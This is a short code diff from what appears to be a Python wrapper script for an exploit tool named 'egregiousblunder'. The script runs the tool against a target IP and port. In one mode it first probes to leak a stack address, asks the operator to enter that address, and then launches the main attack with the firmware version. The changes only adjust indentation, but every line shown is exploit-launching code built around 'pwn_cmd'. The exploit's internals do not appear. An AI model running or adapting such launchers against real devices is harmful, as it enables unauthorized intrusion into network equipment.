@@ -88,10 +88,10 @@ if __name__ == '__main__':
                 wam_cmd = "./egregiousblunder_3.0.0.1 -t %s -p %d -l 5432 --ssl %s -v --config ./EGBL.config --wam 10" % (
                     ip, port, ssloption)
                 if not WAM:
-               		subprocess.Popen(shlex.split(pwn_cmd), shell=True)
-           		else:
-	                subprocess.Popen(shlex.split(wam_cmd), shell=True)
-	                stackadress = raw_input("[*]Please input stack address outputed just now:")
-	                pwn_cmd = "./egregiousblunder_3.0.0.1 -t %s -p %d -l 5432 --ssl %s -v --config ./EGBL.config --stack %s --nopen --gen %s" % (
+               	    subprocess.Popen(shlex.split(pwn_cmd), shell=True)
+           	else:
+	            subprocess.Popen(shlex.split(wam_cmd), shell=True)
+	            stackadress = raw_input("[*]Please input stack address outputed just now:")
+	            pwn_cmd = "./egregiousblunder_3.0.0.1 -t %s -p %d -l 5432 --ssl %s -v --config ./EGBL.config --stack %s --nopen --gen %s" % (
 	                ip, port, ssloption, stackadress, firm_version)
-	                subprocess.Popen(shlex.split(pwn_cmd), shell=True)
+	            subprocess.Popen(shlex.split(pwn_cmd), shell=True)
